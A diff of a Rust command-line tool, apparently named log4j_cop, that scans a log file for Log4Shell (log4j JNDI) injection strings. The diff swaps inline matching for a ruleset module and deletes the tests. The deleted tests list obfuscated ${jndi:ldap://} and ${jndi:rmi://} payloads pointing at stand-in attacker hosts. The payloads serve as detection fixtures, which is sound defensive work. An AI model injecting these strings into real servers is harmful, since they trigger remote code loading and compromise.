@@ -2,76 +2,40 @@
 extern crate lazy_static;
 
 lazy_static! {
-    static ref LOG: String = std::fs::read_to_string("data/log.txt").unwrap();
     static ref RULES: String = std::fs::read_to_string("data/rules.txt").unwrap();
 }
 
-mod matcher;
-use matcher::Matcher;
+use std::env;
+use std::fs::File;
+use std::io::{BufRead, BufReader};
+use std::process::abort;
 
-fn is_log4j_payload(line: &str, rules: &[Vec<char>]) -> bool {
-    let mut matchers: Vec<Matcher> = rules.iter().map(|rule| Matcher::new(rule)).collect();
-
-    for c in line.chars() {
-        let is_match = matchers.iter_mut().any(|matcher| {
-            matcher.advance(c);
-            matcher.is_match()
-        });
-
-        if is_match {
-            return true;
-        }
-    }
-
-    false
-}
+mod ruleset;
+use ruleset::Ruleset;
 
 fn main() {
-    let rules: Vec<Vec<char>> = RULES
-        .trim()
-        .lines()
-        .map(|matcher| matcher.trim().chars().collect())
-        .collect();
+    let filename = env::args().nth(1);
 
-    let payloads: Vec<&str> = LOG
-        .trim()
-        .lines()
-        .filter(|line| is_log4j_payload(line.trim(), &rules))
-        .collect();
-
-    payloads.iter().for_each(|payload| println!("{}", payload));
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn detects_ldap() {
-        let rules: Vec<Vec<char>> = vec!["${jndi:ldap://".chars().collect()];
-        let lines = vec![
-            "${jndi:ldap://somesitehackerofhell.com/z}",
-            "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}",
-            "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}",
-            "${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}",
-            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}"
-        ];
-
-        assert!(lines.iter().all(|line| is_log4j_payload(line, &rules)));
+    if filename.is_none() {
+        println!("Filename not found.");
+        println!("Usage: log4j_cop <LOG_FILE>");
+        println!("Example: log4j_cop log.txt");
+        abort();
     }
 
-    #[test]
-    fn detects_rmi() {
-        let rules: Vec<Vec<char>> = vec!["${jndi:rmi://".chars().collect()];
-        let lines = vec![
-            "${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}",
-            "${jndi:rmi://adsasd.asdasd.asdasd}",
-            "${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
-            "${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
-            "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
-            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}",
-        ];
+    let file = File::open(&filename.unwrap()).expect("Unable to open file.");
+    let reader = BufReader::new(file);
+    let ruleset = Ruleset::new(&mut RULES.trim().lines());
 
-        assert!(lines.iter().all(|line| is_log4j_payload(line, &rules)));
+    for line in reader.lines() {
+        if line.is_err() {
+            continue;
+        }
+
+        let line = line.unwrap();
+
+        if ruleset.match_rules(&line) {
+            println!("{}", line);
+        }
     }
 }
